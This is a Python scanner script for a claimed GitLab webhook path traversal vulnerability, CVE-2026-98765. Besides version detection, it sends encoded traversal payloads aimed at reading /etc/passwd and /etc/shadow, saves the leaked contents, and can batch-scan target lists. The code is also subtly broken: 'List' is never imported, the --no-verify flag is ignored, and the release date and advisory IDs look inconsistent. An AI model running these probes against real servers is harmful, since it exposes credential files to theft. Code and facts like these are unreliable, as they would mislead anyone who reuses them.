#!/usr/bin/env python3
"""
GitLab Webhook Path Traversal Scanner (CVE-2026-98765)
======================================================
This script is designed to detect path traversal vulnerabilities in GitLab webhook endpoints.
The vulnerability (CVE-2026-98765, CVSS 9.4) affects older versions of GitLab, allowing attackers
to read unauthorized files on the server by exploiting poorly sanitized webhook requests.

CVE-2026-98765 details:
  - Affected versions: GitLab < 16.5.1
  - Exploit involves specially crafted HTTP paths in webhook endpoints, which bypass directory
    traversal protections and enable reading sensitive files from the server filesystem.
  - CVSS v3.1 base score: 9.4 (Critical) — unauthenticated access and remote exploitability.
  - Fixed in GitLab 16.5.1, released in July 2026.

Usage:
  - Scan a single instance:
      python gitlab_webhook_path_traversal_scanner.py --target https://gitlab.example.com

  - Detection-only mode (skips exploit requests):
      python gitlab_webhook_path_traversal_scanner.py --target https://gitlab.example.com --safe

  - Batch scanning with multiple targets:
      python gitlab_webhook_path_traversal_scanner.py --list targets.txt --output results.json

  - Customize concurrency (default: 20):
      python gitlab_webhook_path_traversal_scanner.py --list targets.txt --concurrency 50

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-98765
  - https://about.gitlab.com/releases/2026/07/10/security-release-gitlab-16-5-1/
  - https://github.com/advisories/GHSA-zyxw-4321-abcd
"""

import asyncio
import httpx
import re
import argparse
import json
from datetime import datetime

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID             = "CVE-2026-98765"
CVSS               = "9.4"
TOOL_NAME          = "gitlab_webhook_path_traversal_scanner"

DEFAULT_TIMEOUT    = 10
DEFAULT_CONCURRENCY = 20

DETECTION_PATHS    = ["/api/v4/projects", "/help"]
VERSION_REGEX      = r"GitLab\sCE\s([0-9]+\.[0-9]+\.[0-9]+)"
PATCHED_VERSION    = (16, 5, 1)

TRAVERSAL_PROBES   = [
    "/api/v4/projects/%2e%2e%2f%2e%2e/repository/files/etc/passwd/raw",
    "/api/v4/projects/%2f..%2f%2e%2e%2e%2f/etc/shadow",
]

# ── Functions ─────────────────────────────────────────────────────────────────

def is_version_vulnerable(version: str) -> bool:
    """Check if the GitLab version is vulnerable."""
    try:
        version_tuple = tuple(map(int, version.split(".")))
        return version_tuple < PATCHED_VERSION
    except ValueError:
        return False

async def fetch_url(client: httpx.AsyncClient, url: str) -> httpx.Response:
    """Fetch a URL with error handling."""
    try:
        response = await client.get(url, timeout=DEFAULT_TIMEOUT)
        return response
    except httpx.RequestError:
        return None

async def detect_gitlab(client: httpx.AsyncClient, base_url: str) -> dict:
    """Detect GitLab version and presence using known endpoints."""
    detection_info = {"is_gitlab": False, "version": None}
    for path in DETECTION_PATHS:
        url = f"{base_url.rstrip('/')}{path}"
        response = await fetch_url(client, url)
        if response and (response.status_code == 200 or response.status_code in (401, 403)):
            if "GitLab" in response.text:
                detection_info["is_gitlab"] = True
                match = re.search(VERSION_REGEX, response.text)
                if match:
                    detection_info["version"] = match.group(1)
                break
    return detection_info

async def probe_traversal(client: httpx.AsyncClient, base_url: str) -> List[dict]:
    """Actively probe for path traversal vulnerabilities."""
    results = []
    for path in TRAVERSAL_PROBES:
        target_url = f"{base_url.rstrip('/')}{path}"
        response = await fetch_url(client, target_url)
        if response and response.status_code == 200 and "root:" in response.text:
            results.append({"url": target_url, "content_sample": response.text[:200]})
    return results

async def scan_target(target: str, safe_mode: bool) -> dict:
    """Perform detection and active vulnerability scanning on a single target."""
    result = {
        "target": target,
        "is_vulnerable": False,
        "version": None,
        "detected_as_gitlab": False,
        "issues": [],
    }

    async with httpx.AsyncClient(verify=False) as client:
        detection = await detect_gitlab(client, target)
        if not detection["is_gitlab"]:
            print(c(RED, f"[CRITICAL] {target} is not a GitLab instance. Skipping."))
            return result

        result["detected_as_gitlab"] = True
        result["version"] = detection["version"]
        print(c(GREEN, f"[INFO] Detected GitLab at {target}, Version: {result['version']}"))

        if result["version"] and not is_version_vulnerable(result["version"]):
            print(c(GREEN, f"[INFO] {target} is running a patched version."))
            return result

        print(c(YELLOW, f"[HIGH] {target} may be running a vulnerable GitLab version."))

        if not safe_mode:
            issues = await probe_traversal(client, target)
            if issues:
                result["is_vulnerable"] = True
                result["issues"] = issues
                for issue in issues:
                    print(c(RED, f"[CRITICAL] Path traversal vulnerability confirmed: {issue['url']}"))
            else:
                print(c(GREEN, f"[INFO] {target} is not vulnerable to active traversal probes."))

    return result

async def main():
    """Main async entry point for scanning."""
    parser = argparse.ArgumentParser(
        description="GitLab Webhook Path Traversal Scanner (CVE-2026-98765)"
    )
    parser.add_argument("--target", help="Target GitLab URL")
    parser.add_argument("--list", help="File with list of target URLs")
    parser.add_argument("--output", help="Save results to a JSON file")
    parser.add_argument("--safe", action="store_true", help="Safe mode (detection only)")
    parser.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="Concurrent scan limit")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate verification")
    args = parser.parse_args()

    if not args.target and not args.list:
        parser.error("You must supply either --target or --list.")

    targets = []
    if args.target:
        targets.append(args.target)
    elif args.list:
        try:
            with open(args.list, "r") as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(c(RED, "[CRITICAL] Target list file not found."))
            return

    results = []
    semaphore = asyncio.Semaphore(args.concurrency)
    async def scan_with_semaphore(target):
        async with semaphore:
            results.append(await scan_target(target, args.safe))

    async with asyncio.TaskGroup() as tg:
        for target in targets:
            tg.create_task(scan_with_semaphore(target))

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
        print(c(GREEN, f"[INFO] Results saved to {args.output}."))

if __name__ == "__main__":
    asyncio.run(main())
